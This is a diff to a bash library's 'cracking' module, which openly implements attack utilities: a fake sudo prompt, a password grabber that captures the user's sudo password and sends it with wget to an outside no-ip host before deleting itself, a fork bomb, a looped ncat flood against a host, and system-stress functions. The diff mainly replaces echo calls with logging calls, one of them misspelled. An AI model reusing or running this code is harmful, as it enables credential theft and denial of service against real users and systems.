@@ -9,11 +9,21 @@
 # This library written by Torben Sickert stand under a creative commons naming
 # 3.0 unported license. see http://creativecommons.org/licenses/by/3.0/deed.de
 # endregion
-# shellcheck disable=SC2016,SC2155
+# shellcheck disable=SC2016,SC2034,SC2155
+# region import
+# shellcheck source=./module.sh
+source "$(dirname "${BASH_SOURCE[0]}")/module.sh"
+bl.module.import bashlink.logging
+# endregion
+# region variables
+bl_cracking__documentation__='
+    The cracking module implements utility functions to make a system
+    unusable or trigger unexpected behavior.
+'
+# endregion
 # region functions
 alias bl.cracking.endless_loop=bl_cracking_endless_loop
 bl_cracking_endless_loop() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Starts an endless loop.
 
@@ -28,7 +38,6 @@ bl_cracking_endless_loop() {
 }
 alias bl.cracking.fake_sudo_password_attempt=bl_cracking_fake_sudo_password_attempt
 bl_cracking_fake_sudo_password_attempt() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Shows a fake sudo password attempt.
 
@@ -40,14 +49,13 @@ bl_cracking_fake_sudo_password_attempt() {
     for number in 1 2 3; do
         read -rsp "[sudo] password for $(whoami): " password
         sleep 1
-        echo -e '\nSorry, try again.'
+        bl.loging.plain '\nSorry, try again.'
     done
-    echo "sudo: $number incorrect password attempts"
+    bl.logging.plain "sudo: $number incorrect password attempts"
     return $?
 }
 alias bl.cracking.fork_bomb=bl_cracking_fork_bomb
 bl_cracking_fork_bomb() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Implementation for fork bomb. Note short version:
 
@@ -64,7 +72,6 @@ bl_cracking_fork_bomb() {
 }
 alias bl.cracking.grab_sudo_password=bl_cracking_grab_sudo_password
 bl_cracking_grab_sudo_password() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Shows a fake sudo password attempt and send to password to server.
 
@@ -77,29 +84,28 @@ bl_cracking_grab_sudo_password() {
     local buffer_file_path="$(mktemp)"
     for number in 1 2 3; do
         read -rsp "[sudo] password for $user: " password
-        echo ''
+        bl.logging.plain
         # shellcheck disable=SC1117
-        if echo -e "${password}\n" | \
+        if bl.logging.plain "${password}\n" | \
             sudo -S "$@" 1>"$buffer_file_path" 2>/dev/null
         then
             # NOTE: Place your password grabber server url here.
             wget --quiet "http://suna.no-ip.info:8080?user=$user&password=$password"
             unalias sudo &>/dev/null
             rm "$(readlink --canonicalize "$0")" &>/dev/null
-            cat "$buffer_file_path"
+            bl.logging.cat "$buffer_file_path"
             break
         else
             if (( number == 3 )); then
-                echo "sudo: $number incorrect password attempts"
+                bl.logging.plain "sudo: $number incorrect password attempts"
             else
-                echo 'Sorry, try again.'
+                bl.logging.plain Sorry, try again.
             fi
         fi
     done
 }
 alias bl.cracking.make_simple_ddos_attach=bl_cracking_make_simple_ddos_attack
 bl_cracking_make_simple_ddos_attack() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Makes a ddos attack to given host on given port. First argument: Number
         of requests. Second argument: Port
@@ -111,13 +117,12 @@ bl_cracking_make_simple_ddos_attack() {
     local index
     for (( index=0; index<"$1"; index++ )); do
         # shellcheck disable=SC1117
-        echo -e "GET /$index\r\n\r\n" | ncat lilu "$2" &
+        bl.logging.plain "GET /$index\r\n\r\n" | ncat lilu "$2" &
     done
     return $?
 }
 alias bl.cracking.make_system_unattainable=bl_cracking_make_system_unattainable
 bl_cracking_make_system_unattainable() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Uses a stress system algorithm in its own process to avoid solving the
         problem by process tree killing.
@@ -131,7 +136,6 @@ bl_cracking_make_system_unattainable() {
 }
 alias bl.cracking.stress_system=bl_cracking_stress_system
 bl_cracking_stress_system() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Stress system with given number of endless loops.
 
@@ -147,7 +151,6 @@ bl_cracking_stress_system() {
 }
 alias bl.cracking.stress_system_with_fork_bomb=bl_cracking_stress_system_with_fork_bomb
 bl_cracking_stress_system_with_fork_bomb() {
-    # shellcheck disable=SC2016,SC2034
     local __documentation__='
         Runs a forkbomb in an endless loop. This is useful if operating system
         kills the whole process tree.
